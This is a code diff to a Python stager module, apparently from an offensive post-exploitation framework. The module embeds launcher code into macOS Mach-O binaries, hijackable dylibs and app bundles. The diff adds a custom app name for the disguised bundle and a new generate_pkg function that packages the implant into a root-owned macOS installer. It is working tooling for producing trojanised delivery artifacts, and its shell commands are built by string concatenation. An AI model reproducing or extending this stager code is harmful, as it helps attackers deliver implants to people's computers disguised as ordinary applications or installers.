@@ -11,7 +11,10 @@ import helpers
 import encryption
 import os
 import base64
-
+import shutil
+import zipfile
+import macholib.MachO
+import subprocess
 
 class Stagers:
 
@@ -308,7 +311,7 @@ class Stagers:
         Generates a macho binary with an embedded python interpreter that runs the launcher code
         """
 
-        import macholib.MachO
+       
 
         MH_EXECUTE = 2
         f = open(self.installPath + "/data/misc/machotemplate", 'rb')
@@ -347,7 +350,7 @@ class Stagers:
         """
         Generates a dylib with an embedded python interpreter and runs launcher code when loaded into an application.
         """
-        import macholib.MachO
+        
 
         MH_DYLIB = 6
         if hijacker.lower() == 'true':
@@ -392,15 +395,13 @@ class Stagers:
             print helpers.color("[!] Unable to patch dylib")
 
 
-    def generate_appbundle(self, launcherCode, Arch, icon):
+    def generate_appbundle(self, launcherCode, Arch, icon, AppName):
 
         """
         Generates an application. The embedded executable is a macho binary with the python interpreter.
         """
 
-        import macholib.MachO
-        import shutil
-        import os
+        
 
         MH_EXECUTE = 2
 
@@ -438,12 +439,15 @@ class Stagers:
 
             launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
             patchedBinary = template[:offset]+launcher+template[(offset+len(launcher)):]
-            tmpdir = "/tmp/application/launcher.app/"
+            if AppName == '':
+                AppName = "launcher"
+
+            tmpdir = "/tmp/application/%s.app/" % AppName
             shutil.copytree(directory, tmpdir)
             f = open(tmpdir + "Contents/MacOS/launcher","wb")
             f.write(patchedBinary)
             f.close()
-            os.chmod(tmpdir+"Contents/MacOS/launcher", 0777)
+            os.chmod(tmpdir+"Contents/MacOS/launcher", 0755)
 
             if icon != '':
                 iconfile = os.path.splitext(icon)[0].split('/')[-1]
@@ -512,7 +516,7 @@ class Stagers:
                 f.close()
 
             shutil.make_archive("/tmp/launcher", 'zip', "/tmp/application")
-            shutil.rmtree(tmpdir)
+            shutil.rmtree('/tmp/application')
 
             f = open("/tmp/launcher.zip","rb")
             zipbundle = f.read()
@@ -523,3 +527,35 @@ class Stagers:
             
         else:
             print helpers.color("[!] Unable to patch application")
+
+
+    def generate_pkg(self, bundleZip):
+
+        #unzip application bundle zip. Copy everything for the installer pkg to a temporary location
+        currDir = os.getcwd()
+        os.chdir("/tmp/")
+        f = open("app.zip","wb")
+        f.write(bundleZip)
+        f.close()
+        zipf = zipfile.ZipFile('app.zip','r')
+        zipf.extractall()
+        zipf.close()
+        os.remove('app.zip')
+
+        os.system("cp -r "+self.installPath+"/data/misc/pkgbuild/ /tmp/")
+        os.chdir("pkgbuild")
+        os.system("cp -r ../launcher.app root/Applications")
+        os.system("chmod +x root/Applications/")
+        os.system("( cd root && find . | cpio -o --format odc --owner 0:80 | gzip -c ) > expand/Payload")
+        os.system("chmod +x expand/Payload")
+        os.system("( cd scripts && find . | cpio -o --format odc --owner 0:80 | gzip -c ) > expand/Scripts")
+        os.system("chmod +x expand/Scripts")
+        os.system("mkbom -u 0 -g 80 root expand/Bom")
+        os.system("chmod +x expand/Bom")
+        os.system('( cd expand && xar --compression none -cf "../launcher.pkg" * )')
+        f = open('launcher.pkg','rb')
+        package = f.read()
+        os.chdir("/tmp/")
+        shutil.rmtree('pkgbuild')
+        shutil.rmtree('launcher.app')
+        return package
